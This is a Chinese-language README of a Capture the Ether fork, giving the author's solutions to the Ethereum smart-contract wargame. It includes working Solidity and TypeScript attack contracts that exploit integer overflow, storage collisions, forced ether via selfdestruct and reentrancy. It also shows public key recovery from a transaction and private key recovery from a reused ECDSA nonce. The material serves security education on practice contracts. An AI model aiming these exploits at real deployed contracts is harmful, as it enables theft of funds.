# capture-the-ether

Fork 自 https://github.com/MrToph/capture-the-ether.

我的 [capture-the-ether](https://capturetheether.com/) 题解。

## Development

部署环境：

```bash
npm i
```

配置环境变量：

```bash
cp .env.template .env
# fill out
```

选择一串你的钱包助记词（像一开始在metamask注册那样）生成私钥和地址，并选择第一个账户作为你的挑战账户。

同时选择带有存档数据的ropsten节点作为url。

#### Hardhat

该挑战使用 [hardhat](https://hardhat.org/) 进行。

实现的ts代码位于 [`/test`](./test)，合约代码位于[/contracts](./contracts)。

由于需要fork ropsten测试网，请选用带存档数据的ropsten节点作为url。由于以太坊升级的原因， [hardhat](https://hardhat.org/)官方推荐的 [alchemy](https://www.alchemy.com) 已经不再支持ropsten测试网节点，挑战中我选用[Infura](https://infura.io/)的节点来进行攻击和测试。

#### Running challenges

可以将 `hardhat.config.ts`中的fork区块号设置为所有挑战合同部署后的区块号，这样在测试时就可以直接和挑战合约 交互了。

```bash
#在本地的fork节点测试
npx hardhat test test/warmup/call-me.ts
#一旦测试通过，即可将交易提交到测试网上
npx hardhat test test/warmup/call-me.ts --network ropsten
```

#### My Solution

##### [Warmup](https://capturetheether.com/challenges/warmup/)

###### [Deploy a contract](https://capturetheether.com/challenges/warmup/deploy/)

该挑战需要注册metamask，并使用metamask部署合约。

这里推荐在[https://iancoleman.io/bip39/](https://iancoleman.io/bip39/) 上输入助记词，并取第一个生成的私钥和地址作为挑战账户。之后将私钥导入到metamask中，并通过ropsten的水管获得一定量的eth作为挑战的初期部署。同时也要将助记词作为.env中的`MNEMONIC`环境变量的值，来进行接下来的挑战。

###### [Call me](https://capturetheether.com/challenges/warmup/call-me/)

调用合约中的`callme()` ,和合约进行交互即可完成挑战。

###### [Choose a nickname](https://capturetheether.com/challenges/warmup/nickname/)

调用`0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee` 的 `setNickname(bytes32)`设置你的昵称，即可完成挑战。

##### [Lotteries](https://capturetheether.com/challenges/lotteries/)

###### [Guess the number](https://capturetheether.com/challenges/lotteries/guess-the-number/)

合约硬编码了一个42作为最终答案，调用`guess(42)`即可完成挑战。

###### [Guess the secret number](https://capturetheether.com/challenges/lotteries/guess-the-secret-number/)

合约硬编码了一个bytes32的answerHash，然而猜的数字是一个uint8，也就是说最多$2^8 = 256$个数字中必有一个答案，因此线下遍历256个数，计算他的keccak256值是否等于answerHash。找到相等的n发送调用`guess(n)`即可完成挑战。

###### [Guess the random number](https://capturetheether.com/challenges/lotteries/guess-the-random-number/)

合约这次在初始化的时候随机了一个数，并存在合约slot 0 的位置。由于智能合约是完全公开的，因此我们只需要读取合约上slot 0 位置的数据即可知道答案。

```javascript
    secretNumber = BigNumber.from(await contract.provider.getStorageAt(contract.address, 0))
```



###### [Guess the new number](https://capturetheether.com/challenges/lotteries/guess-the-new-number/)

合约不再硬编码值存储在slot 0作为答案了，取而代之的是以guess时的区块哈希和时间去计算答案：

```solidity
uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
```

因此编写一个攻击合约，事先计算出当前的anser再调用`guess`函数即可。

```solidity
 function attack() external payable {
        uint8 answer =  uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        challenge.guess{value:1 ether}(answer);
        require(challenge.isComplete(),"challenge not completed");
        payable(msg.sender).transfer(2 ether);
    }
```

###### [Predict the future](https://capturetheether.com/challenges/lotteries/predict-the-future/)

用户需要调用`lockInGuess(n)`来锁住猜测的数，并在未来调用`settle()`,利用当前区块的哈希和时间去计算一个答案，来验证是否和猜测的数相等。挑战中的数返回的是一个%10的值，随机命中的概率挺高，因此只要不断发交易，直到命中即可。

###### [Predict the block hash](https://capturetheether.com/challenges/lotteries/predict-the-block-hash/)

这次合约中我没有看到可以直接攻击的方向，也看不到一些直接利用的trick。注意到answer产生的方式和之前略有不同，只取了blockhash：

```solidity
bytes32 answer = block.blockhash(settlementBlockNumber);
```

因此去看看block.blockhash上有没有什么攻击点。通过solidity的官方文档可以查阅到这是旧版的`block.blockhash`，只能查到当前块往前256个块的blockhash，超过会产生错误，返回`0x00`。因此只需要把`0x00`作为答案锁在合约里，耐心等待256个块的时间(一个小时左右)过去,在调用`settle()`即可完成挑战。

tips：新版的blockhash没有这个问题，别用这个旧函数。

##### [Math](https://capturetheether.com/challenges/math/)

###### [Token sale](https://capturetheether.com/challenges/math/token-sale/)

这个代币合约的buy()函数的检查存在上溢漏洞：

```solidity
    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }
```

因此我将numTokens的值设置为`(type(uint256).max / (1 ether)) + 1`,并以此计算上溢应该发送的msg.value(不超过1ether),调用buy()函数即可获得大额的该token。然后调用sell()函数卖出1个该token换取1ether，即可使合约的balance小于1ether，完成该挑战。

```solidity
    function attack() external payable {
        uint256 number = (type(uint256).max / (1 ether)) + 1;
        uint256 sendValue = number * (1 ether);
        challenge.buy{value:sendValue}(number);
        challenge.sell(1);
        payable(msg.sender).transfer(address(this).balance);
    }
```

###### [Token whale](https://capturetheether.com/challenges/math/token-whale/)

合约中的`transferFrom()`函数有一个很明显的错误：

```solidity
    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
        function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
    }
```

明明是`transferFrom()`，转移的却是`msg.sender`的代币。因此可以利用这点来让一个没有余额的账户余额发生下溢，从而获得大量该代币，然后转给自己从而完成挑战。

```solidity
    function attack() external {
        challenge.transferFrom(msg.sender, msg.sender, tokenAmount);
        challenge.transfer(msg.sender, getAmount);
        require(challenge.isComplete(), "get number of token Insufficient!");
    }
```

###### [Retirement fund](https://capturetheether.com/challenges/math/retirement-fund/)

这个合约的溢出攻击点在于withdraw计算可能产生下溢，从而绕开`collectPenalty()`的检查，提走合约中的所有eth：

```solidity
 function collectPenalty() public {
        require(msg.sender == beneficiary);

        uint256 withdrawn = startBalance - address(this).balance;

        // an early withdrawal occurred
        require(withdrawn > 0);

        // penalty is what's left
        msg.sender.transfer(address(this).balance);
    }
```

我们只需要给合约转点eth，即可产生下溢完成攻击。

然而合约没有任何payable函数和receive函数，无法给合约发送eth。这时候就需要一个可以强制给合约发送eth的手段了：`selfdestruct(target)`自毁函数。

合约调用自毁函数后，会将合约所有的eth余额强制发送给target地址，并且不需要任何条件。利用这个函数写一个自毁合约，并往挑战合约中发送eth，即可使withdraw计算产生下溢，绕开检查，获取大量代币完成挑战。

我的自毁合约如下：

```solidity
contract RetirementFundAttacker {

    constructor (address payable victimAddress) payable {
        require(msg.value > 0);
        selfdestruct(victimAddress);
    }
}
```

###### [Mapping](https://capturetheether.com/challenges/math/mapping/)

这是一个涉及存储布局的挑战，可以通过该挑战作者的博文[Understanding Ethereum Smart Contract Storage](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)了解合约的存储布局。这个合约可以让用户在任意key位置写入value值，其实就是用户可以控制合约中任意存储位置的值了，因此只需找到isComplete变量位置对应的key值，将其变为1，即可完成挑战。

```solidity
    function attack() external payable {
        uint256 key = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;
        challenge.set(key,uint256(1));
        require(challenge.isComplete(),"challenge is not completed!");
    }
```

###### [Donation](https://capturetheether.com/challenges/math/donation/)

这个挑战也涉及了合约存储布局上的问题。注意donation变量定义和赋值的位置：

```solidity
function donate(uint256 etherAmount) public payable {
        // amount is in ether, but msg.value is in wei
        uint256 scale = 10**18 * 1 ether;
        require(msg.value == etherAmount / scale);

        Donation donation;
        donation.timestamp = now;
        donation.etherAmount = etherAmount;

        donations.push(donation);
    }
```

如果常用一些高级语言写代码，这样看起来好像没什么问题，因为他们会找一块没有使用的内存位置来存储donation。然而solidity中，donation在定义出来之后并没有进行赋值(undefined)，会被定位在slot 0位置。因此`donation.timestamp = now`会将donations队列长度修改为now，` donation.etherAmount = etherAmount`会将owner修改为etherAmount，可以通过`donate()`函数进行提权。

但是这样是不是要花费大量的eth来操作？并不需要。注意到合约的`scale`实际上是$10^{36}$,而一个address是uint160，是$2^{160}$ 约$10^{42}$量级，因此最多发送$10^6$量级的eth，这是远远小于1 ether的量的，因此只需发送少量eth即可实现提权，然后调用`withdraw()`将合约的eth全部提取出来完成挑战。

by the way，现在这个问题很难产生，编译器加了检查，对于这种指针需要定义"storage", "memory" 或 "calldata"来防止这种情况发生。

```solidity
    function attack() external payable {
        uint256 etherAmount = uint256(uint160(address(this)));
        uint256 donateAmount = etherAmount / (10 ** 36);
        challenge.donate{value:donateAmount}(etherAmount);
        challenge.withdraw();
        payable(msg.sender).transfer(address(this).balance);
        require(challenge.isComplete(),"challenge is not completed!");
    }
```

###### [Fifty years](https://capturetheether.com/challenges/math/fifty-years/)

这个挑战是上述所有math挑战的综合，因此他特别具有挑战性。

这个挑战需要我将一个lock 50年的合约里的eth全部提取出来，因此我们需要将`contribution`队列中最后一次贡献的时间戳设置为一个我们能立即提取出来的值(当然是0值，这样我们能随意提取出来了)。

注意增加`contribution`项的函数：

```solidity
    function upsert(uint256 index, uint256 timestamp) public payable {
        require(msg.sender == owner);

        if (index >= head && index < queue.length) {
            // Update existing contribution amount without updating timestamp.
            Contribution storage contribution = queue[index];
            contribution.amount += msg.value;
        } else {
            // Append a new contribution. Require that each contribution unlock
            // at least 1 day after the previous one.
            require(timestamp >= queue[queue.length - 1].unlockTimestamp + 1 days);

            contribution.amount = msg.value;
            contribution.unlockTimestamp = timestamp;
            queue.push(contribution);
        }
    }
```

他有一个很明显的可以利用的上溢点：

```solidity
require(timestamp >= queue[queue.length - 1].unlockTimestamp + 1 days);
```

我们可以先插入一个`timestamp = type(uint256).max - 1 days + 1`的项，之后就可以插入一个`timestamp = 0 `的项了。

然而这里不仅有上溢问题，还有一个[Donation](https://capturetheether.com/challenges/math/donation/)提及的存储上的问题：

```solidity
            contribution.amount = msg.value;
            contribution.unlockTimestamp = timestamp;
            queue.push(contribution);
```

他又对一个`undefined`的指针进行操作了，这将导致每次插入contribution的队列长度被修改为msg.value，队头值head被修改为timestamp。因此我们需要确保最后一次插入的msg.value为最终队列长度 - 1（2），timestamp覆盖到队头0，这样才能提出所有代币。因此我执行了两次如下的插入：

```solidity
    const ONE_DAY = 24 * 60 * 60;
    const DATE_OVERFLOW = BigNumber.from(`2`).pow(`256`).sub(ONE_DAY);
    await contract.upsert(1,DATE_OVERFLOW,{value:1,gasLimit:1e5});
    await contract.upsert(2,0,{value:2,gasLimit:1e5});
```

那这样就可以将所有代币提取出来了吗？并不行。注意到`queue.push(contribution)`,他会将队列长度+1，再插入。因此实际存储的`contribution.amount`为`msg.value + 1`，由于我们做了两次操作，他记录的eth值会比实际存储的值多出两wei。因此我们需要用到[Retirement fund](https://capturetheether.com/challenges/math/retirement-fund/)的自毁函数，强制发2wei给合约，才能把所有eth提出来。

```typescript
    const ONE_DAY = 24 * 60 * 60;
    const DATE_OVERFLOW = BigNumber.from(`2`).pow(`256`).sub(ONE_DAY);
    await contract.upsert(1,DATE_OVERFLOW,{value:1,gasLimit:1e5});
    await contract.upsert(2,0,{value:2,gasLimit:1e5});
    const factory = await ethers.getContractFactory("RetirementFundAttacker", attacker);
    let attackerContract = await factory.deploy(contract.address,{value:2,gasLimit:1e5});
    await contract.withdraw(2,{gasLimit:1e5});
```

##### [Accounts](https://capturetheether.com/challenges/accounts/)

###### [Fuzzy identity](https://capturetheether.com/challenges/accounts/fuzzy-identity/)

这个挑战要求一个能返回`name() == bytes32("smarx")` 并且address包含`badc0de`串的合约跟他进行交互，才可以完成挑战。

地址总共有$2^{160}$种可能，在串中任意出现`badc0de`,考虑容斥原理的计算,至少有$C_{34}^{1}* 2^{132} - (C_{34}^2 - (2 * \sum_6^{11} + 22 * 12)) * 2^{104} = 34 * 2^{132} - 195 * 2^{104} \ge 32 * 2^{132}$种可能,因此碰撞出对应hash的概率至少为$\frac{2^5}2^{28}=\frac{1}{2^{23}} = \frac{1}{8388608}$,平均八百多万分之一的概率能碰到，幸好我脸并不是很黑，跑了9445858个salt就碰上正确的合约地址了。

我利用create2加入salt值来计算新合约的地址。首先我在测试网上部署了一个合约，fork部署后的块，在本机上调用合约`find（）`，不断增加salt去计算地址是否符合要求。当计算出符合要求的地址后，我就在测试网上调用`attack()`，输入该salt值产生符合要求的合约去和challenge交互，完成了该挑战。

```solidity
 contract FuzzyIdentityAttacker {
    address public challenge;
    bytes32 public initHash;
    uint256 public saltNumber;
    bytes20 constant id = hex"000000000000000000000000000000000badc0de";
    bytes20 constant mask = hex"000000000000000000000000000000000fffffff";
    uint256 public successNumber;
 constructor (address challengeAddress) {
        challenge = challengeAddress;
        initHash = keccak256(type(FuzzContract).creationCode);
        saltNumber = 0;
        successNumber = 0;
    }
    function find(uint256 number) external {
        uint256 i = saltNumber;
        saltNumber += number;
        while(i < saltNumber) {
            bytes32 salt = bytes32(i);
            address predictedAddress = address(uint160(uint256(keccak256(abi.encodePacked(hex"ff", address(this), salt, initHash)))));
            if (isBadCode(bytes20(predictedAddress))) {
                bytes memory bytecode = type(FuzzContract).creationCode;
                address success;
                assembly {
                    success := create2(0, add(bytecode, 32), mload(bytecode), salt)
                }
                FuzzContract(success).done(address(challenge));
                successNumber = i;
                break;
            }
            i ++;
        }
    }
    function attack(uint256 number) external {
        bytes32 salt = bytes32(number);
        bytes memory bytecode = type(FuzzContract).creationCode;
        address success;
        assembly {
            success := create2(0, add(bytecode, 32), mload(bytecode), salt)
        }
        FuzzContract(success).done(address(challenge));
    }
    function isBadCode(bytes20 add) internal pure returns (bool) {
        for (uint256 i = 0; i < 34; i++) {
            if (add & mask == id) {
                return true;
            }
            add >>= 4;
        }
        return false;
    }
    receive() external payable {}
}
contract FuzzContract {
    function done(address challengeAddress) external {
        IFuzzyIdentityChallenge(challengeAddress).authenticate();
        selfdestruct(payable(msg.sender));
    }
    function name() external pure returns (bytes32) {
        return bytes32("smarx");
    }
}
```



###### [Public Key](https://capturetheether.com/challenges/accounts/public-key/)

这个挑战要求我恢复owner的公钥来发起攻击。在etherscan上查看该owner的交易，发现了一笔由该onwer发起的交易：

`0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb`

在我获得了他的交易hash之后，我就可以通过`ethers.provider.getTransaction（）`来获取他的全部交易信息并构建签名，然后利用`ethers.utils.recoverPublicKey()`就可恢复出他的公钥。在这过程中我还发现了infura的存档节点交易数据的签名“r”和“v”存储反了，已经反映到infura论坛中，等待后续官方确认。

```solidity
 let firstTxHash = "0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb";
    let firstTx = await ethers.provider.getTransaction(firstTxHash);
    expect(firstTx).not.to.be.undefined;
    console.log(`firstTx`, JSON.stringify(firstTx, null, 4));
    let txData = {
        gasPrice: firstTx.gasPrice,
        gasLimit: firstTx.gasLimit,
        value: firstTx.value,
        nonce: firstTx.nonce,
        data: firstTx.data,
        to: firstTx.to,
        chainId: firstTx.chainId,
    };
    let signingData = ethers.utils.serializeTransaction(txData);
    let msgHash = ethers.utils.keccak256(signingData);
    let signature = { s: firstTx.s,r: firstTx.r == undefined?"":firstTx.r, v: firstTx.v };
    let rawPublicKey = ethers.utils.recoverPublicKey(msgHash, signature);
    expect(rawPublicKey.slice(2, 4), "not a raw public key").to.equal(`04`);
    rawPublicKey = `0x${rawPublicKey.slice(4)}`;
    console.log(`Recovered public key ${rawPublicKey}`);
    let tx = await contract.authenticate(rawPublicKey);
    console.log("transaction hash:",tx.hash);
```

###### [Account Takeover](https://capturetheether.com/challenges/accounts/account-takeover/)

该挑战需要恢复出指定地址的私钥，利用该私钥签名完成挑战。这里的关键点是两笔不同的交易采用相同的r，对应他是加密算法 ECDSA必须唯一输出的值，他由一个随机数k生成。一旦两笔不同交易采用的k生成了相同的r值，就可以通过交易信息来恢复其私钥，2010年索尼就因为重复使用k使得ps3的密钥被盗用：[https://www.bbc.co.uk/news/technology-12116051](https://www.bbc.co.uk/news/technology-12116051)。

如何恢复私钥？可参照[https://web.archive.org/web/20160308014317/http://www.nilsschneider.net/2013/01/28/recovering-bitcoin-private-keys.html](https://web.archive.org/web/20160308014317/http://www.nilsschneider.net/2013/01/28/recovering-bitcoin-private-keys.html)中的方法，先拿到两笔采用相同的r的交易：

`0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396`

`0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009`

获取他们的r、s、并算出交易签名作为z，然后就能通过一定算法算出他的私钥。计算脚本参考：[https://medium.com/coinmonks/smart-contract-exploits-part-3-featuring-capture-the-ether-accounts-c86d7e9a1400](https://medium.com/coinmonks/smart-contract-exploits-part-3-featuring-capture-the-ether-accounts-c86d7e9a1400)。

将私钥导入钱包，和challenge合约交互即可完成挑战。

##### [Miscellaneous](https://capturetheether.com/challenges/miscellaneous/)

###### [Assume ownership](https://capturetheether.com/challenges/miscellaneous/assume-ownership/)

这个挑战是老版本的问题，合约的初始化函数很容易写错，一旦写错就可以被别人调用。本合约的初始化函数写错了一个字母导致他人可以调用函数来提权，从而完成挑战。

###### [Token bank](https://capturetheether.com/challenges/miscellaneous/token-bank/)

这个合约涉及一个重入漏洞，token-bank合约在`withdraw()`时先和token合约交互再减少余额：

```solidity
function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);

        require(token.transfer(msg.sender, amount));
        balanceOf[msg.sender] -= amount;
```

而token合约的transfer逻辑中会去调用一个外部合约的回调函数：

```solidity
    function transfer(address to, uint256 value, bytes data) public returns (bool) {
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);

        if (isContract(to)) {
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }
        return true;
    }
```

因此我们可以写一个包含`tokenFallback()`的攻击合约，在tokenFallback()中调用`withdraw()` ，以`withdraw() => transfer() => tokenfallback() => withdraw（）`的方式重入。由于余额减少的操作在`transfer（）`之后，因此重入时余额一直没有变过，只需在攻击合约的`tokenFallback()`逻辑里将代币余额全部抽干即可。

而在攻击前，用户需要先将代币提取到账户里，并转移给攻击合约，然后攻击合约将代币转给银行，才可以开始攻击。

```solidity
contract TokenBankAttacker {
    IChallenge private challenge;
    ISET private SET;
    constructor (address challengeAddress) {
        challenge = IChallenge(challengeAddress);
    }

    function tokenFallback(address from, uint256 value, bytes calldata data) external {
        if (data.length == 0 && challenge.token().balanceOf(address(challenge)) > 0) {
            uint256 myBalance = challenge.balanceOf(address(this));
            uint256 challengeBalance = challenge.token().balanceOf(address(challenge));
            uint256 balance = myBalance > challengeBalance ? challengeBalance : myBalance;
            challenge.withdraw(balance);
        }else{
            return;
        }
    }

    function attack() external payable {
        uint256 balance = challenge.token().balanceOf(address(this));
        challenge.token().transfer(address(challenge),balance);
        challenge.withdraw(balance);
        balance = challenge.token().balanceOf(address(this));
        challenge.token().transfer(msg.sender,balance);
        require(challenge.isComplete(), "challenge is not completed!");
    }

    receive() external payable {}
}
```









